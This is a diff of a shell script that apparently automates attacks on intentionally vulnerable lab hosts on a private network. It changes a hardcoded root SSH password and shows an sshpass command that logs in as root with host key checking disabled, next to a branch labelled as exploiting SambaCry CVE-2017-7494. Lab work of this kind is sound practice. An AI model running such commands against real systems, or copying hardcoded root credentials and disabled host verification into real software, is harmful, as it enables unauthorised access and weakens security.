@@ -20,9 +20,9 @@ case "$1" in
         ;;
     ssh|vulnssh)
         echo "[*] Pwning SSH with weak creds (172.20.0.17)..."
-        echo "[*] Password is 'root'"
+        echo "[*] Password is 'password123'"
         echo ""
-        sshpass -p 'root' ssh -o StrictHostKeyChecking=no root@172.20.0.17
+        sshpass -p 'password123' ssh -o StrictHostKeyChecking=no root@172.20.0.17
         ;;
     samba|sambacry)
         echo "[*] Pwning SambaCry CVE-2017-7494 (172.20.0.16)..."
